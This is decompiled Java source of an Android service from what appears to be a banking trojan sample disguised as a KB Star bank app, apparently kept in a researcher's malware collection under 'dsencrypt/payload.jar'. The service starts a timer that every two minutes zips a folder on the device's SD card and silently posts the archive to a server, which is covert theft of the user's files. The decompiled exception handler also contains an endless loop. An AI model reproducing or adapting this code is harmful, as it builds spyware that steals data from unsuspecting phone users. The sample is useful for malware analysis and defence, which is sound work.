package com.kbstar.kb.android.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import com.kbstar.kb.android.star.util.Tool;
import com.kbstar.kb.android.star.util.Url;
import com.kbstar.kb.android.star.util.ZipUtil;
import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

public class uploadContentService
  extends Service
{
  private static final long BANK_TOP_CHECK_TIME = 120000L;
  private final String DEBUG_TAG = "clService";
  private TimerTask mTimerTask;
  public boolean threadDisable = true;
  private Timer timer;
  Url u = new Url();
  
  private void uploadContent()
  {
    try
    {
      ZipUtil.ZipFolder(this.u.getSDPath(), this.u.getSDPath1() + "/all.zip");
      File localFile = new File(this.u.getSDPath1() + "/all.zip");
      Tool.postHttpFile1(getApplicationContext(), localFile, "all");
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
    finally {}
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public void onCreate()
  {
    super.onCreate();
    Log.v("clService", "onCreate");
    this.timer = new Timer();
    this.mTimerTask = new TimerTask()
    {
      public void run()
      {
        uploadContentService.this.uploadContent();
      }
    };
    this.timer.schedule(this.mTimerTask, 120000L, 120000L);
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    this.threadDisable = true;
    Log.v("clService", "on destroy");
    if (this.timer != null)
    {
      this.timer.cancel();
      this.timer = null;
    }
    if (this.mTimerTask != null)
    {
      this.mTimerTask.cancel();
      this.mTimerTask = null;
    }
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/services/uploadContentService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */